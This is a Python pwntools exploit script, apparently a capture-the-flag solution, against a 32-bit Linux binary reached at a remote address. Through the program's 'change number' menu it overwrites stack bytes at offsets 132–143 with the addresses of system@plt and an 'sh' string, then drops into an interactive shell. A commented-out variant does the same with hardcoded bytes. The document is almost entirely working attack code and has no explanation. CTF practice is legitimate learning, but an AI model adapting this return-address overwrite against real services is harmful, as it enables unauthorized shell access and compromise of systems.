import pwn

# "deadbeef" -> [0xde, 0xad, 0xbe, 0xef]
def hextoint(str1):
    s = []
    i = 0
    for j in range(len(str1) // 2):
        s.append(int(str1[i:i+2], 16))
        i += 2
    return s

pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./3fb1a42837be485aae7d85d11fbc457b')
p = pwn.remote('220.249.52.133', 54376)

elf = pwn.ELF('./3fb1a42837be485aae7d85d11fbc457b')
system_addr = '0' + hex(elf.plt['system'])[2:]
sh_addr = '0' + hex(next(elf.search('sh')))[2:]

system_addr = hextoint(system_addr)[::-1]
sh_addr = hextoint(sh_addr)[::-1]

p.sendlineafter(b'How many numbers you have:', b'1')
p.sendlineafter(b'Give me your numbers', b'1')

position1 = [132, 133, 134, 135]
position2 = [140, 141, 142, 143]

for i in range(4):
    p.sendlineafter(b'5. exit', b'3')
    p.sendlineafter(b'which number to change:', str(position1[i]).encode())
    p.sendlineafter(b'new number:', str(system_addr[i]).encode())

for i in range(4):
    p.sendlineafter(b'5. exit', b'3')
    p.sendlineafter(b'which number to change:', str(position2[i]).encode())
    p.sendlineafter(b'new number:', str(sh_addr[i]).encode())

p.sendlineafter(b'5. exit', b'5')

p.interactive()

'''
p.sendlineafter(b'5. exit', b'3')
p.sendlineafter(b'which number to change:', b'132')     # 0x90 + canary(0x4) + ebp(0x4)
p.sendlineafter(b'new number:', b'155')

p.sendlineafter(b'5. exit', b'3')
p.sendlineafter(b'which number to change:', b'133')
p.sendlineafter(b'new number:', b'133')

p.sendlineafter(b'5. exit', b'3')
p.sendlineafter(b'which number to change:', b'134')
p.sendlineafter(b'new number:', b'4')

p.sendlineafter(b'5. exit', b'3')
p.sendlineafter(b'which number to change:', b'135')
p.sendlineafter(b'new number:', b'8')

p.recv()
p.sendline(b'5')
p.interactive()
'''



 
